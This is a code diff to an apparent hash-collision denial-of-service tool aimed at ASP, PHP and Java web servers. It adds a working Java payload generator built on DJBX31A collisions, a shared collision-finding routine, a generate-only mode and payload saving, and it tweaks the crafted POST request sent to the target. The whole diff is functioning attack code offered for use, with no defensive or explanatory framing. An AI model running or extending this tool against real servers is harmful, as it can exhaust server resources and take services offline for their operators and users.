@@ -50,6 +50,7 @@ def main():
     parser.add_argument("-o", "--output", dest="output", help="Save Server response to file. This name is only a pattern. HTML Extension will be appended. Implies -w")
     parser.add_argument("-t", "--target", dest="target", help="Target of the attack", choices=["ASP", "PHP", "JAVA"], required=True)
     parser.add_argument("-m", "--max-payload-size", dest="maxpayloadsize", help="Maximum size of the Payload in Megabyte. PHPs defaultconfiguration does not allow more than 8MB", default=8, type=int)
+    parser.add_argument("-g", "--generate", dest="generate", help="Only generate Payload and exit", default=False, action="store_true")
     parser.add_argument("--version", action="version", version="%(prog)s 5.0")
 
     options = parser.parse_args()
@@ -84,19 +85,12 @@ def main():
             print("Target %s not yet implemented" % options.target)
             sys.exit(1)
         elif options.target == "JAVA":
-            #payload = generateJAVAPayload()
-            print("Target %s not yet implemented" % options.target)
-            sys.exit(1)
+            payload = generateJAVAPayload()
         else:
             print("Target %s not yet implemented" % options.target)
             sys.exit(1)
 
         print("Payload generated")
-        if options.save:
-            f = open(options.save, "w")
-            f.write(payload)
-            f.close()
-            print("Payload saved to %s" % options.save)
     else:
         f = open(options.payload, "r")
         payload = f.read()
@@ -106,6 +100,17 @@ def main():
     # trim to maximum payload size (in MB)
     maxinmb = options.maxpayloadsize*1024*1024
     payload = payload[:maxinmb]
+    
+    # Save payload
+    if options.save:
+        f = open(options.save, "w")
+        f.write(payload)
+        f.close()
+        print("Payload saved to %s" % options.save)
+
+    # User selected to only generate the payload
+    if options.generate:
+        return
 
     print("Host: %s" % host)
     print("Port: %s" % str(port))
@@ -126,7 +131,7 @@ def main():
 
         request = "POST %s HTTP/1.1\r\n\
 Host: %s\r\n\
-Content-Type: application/x-www-form-urlencoded\r\n\
+Content-Type: application/x-www-form-urlencoded; charset=utf-8\r\n\
 Connection: Close\r\n\
 User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; de; rv:1.9.2.20) Gecko/20110803 Firefox/3.6.20 ( .NET CLR 3.5.30729; .NET4.0E)\r\n\
 Content-Length: %s\r\n\
@@ -186,7 +191,8 @@ def generateASPPayload():
     return "a=a"
 
 def generateJAVAPayload():
-    return "b=b"
+    a = computeJAVACollisionChars(5)
+    return _generatePayload(a, 8)
 
 def generatePHPPayload():
     # Note: Default max POST Data Length in PHP is 8388608 bytes (8MB)
@@ -209,7 +215,7 @@ def _generatePayload(collisionchars, payloadlength):
         result = inputstring.rjust(length, "0")
         for item in collisionchars:
             result = result.replace(str(item), collisionchars[item])
-        post += "" + urllib.quote(result) + "=&"
+        post += "" + urllib.urlencode({result:""}) + "&"
 
     return post;
 
@@ -228,16 +234,24 @@ def _base_convert(num, base):
     return "".join(arr)
 
 def computePHPCollisionChars(count):
+    return _computeCollisionChars(_DJBX33A, count)
+
+def computeJAVACollisionChars(count):
+    return _computeCollisionChars(_DJBX31A, count)
+
+def _computeCollisionChars(function, count):
     hashes = {}
     counter = 0
     length = 2
     a = ""
-    for i in range(1, 254):
+    for i in range(0, 256):
         a = a+chr(i)
     source = list(itertools.product(a, repeat=length))
     basestr = ''.join(random.choice(source))
-    basehash = _DJBX33A(basestr)
+    basehash = function(basestr)
     print("\tValue: %s\tHash: %s" % (basestr, basehash))
+    for i in basestr:
+        print("\t\tValue: %s\tCharcode: %d" % (i, ord(i)))
     hashes[str(counter)] = basestr
     counter = counter + 1
     for item in source:
@@ -245,9 +259,11 @@ def computePHPCollisionChars(count):
         if tempstr == basestr:
             continue
 
-        temphash = _DJBX33A(tempstr) 
+        temphash = function(tempstr) 
         if temphash == basehash:
             print("\tValue: %s\tHash: %s" % (tempstr, temphash))
+            for i in tempstr:
+                print("\t\tValue: %s\tCharcode: %d" % (i, ord(i)))
             hashes[str(counter)] = tempstr
             counter = counter + 1
         if counter >= count:
@@ -257,7 +273,7 @@ def computePHPCollisionChars(count):
         sys.exit(1)
     return hashes
 
-def _DJBX(inputstring, base, start):
+def _DJBXA(inputstring, base, start):
     counter = len(inputstring) - 1
     result = start
     for item in inputstring:
@@ -267,7 +283,11 @@ def _DJBX(inputstring, base, start):
 
 #PHP
 def _DJBX33A(inputstring):
-    return _DJBX(inputstring, 33, 5381)
+    return _DJBXA(inputstring, 33, 5381)
+
+#Java
+def _DJBX31A(inputstring):
+    return _DJBXA(inputstring, 31, 0)
 
 #ASP
 def _DJBX33X(inputstring):
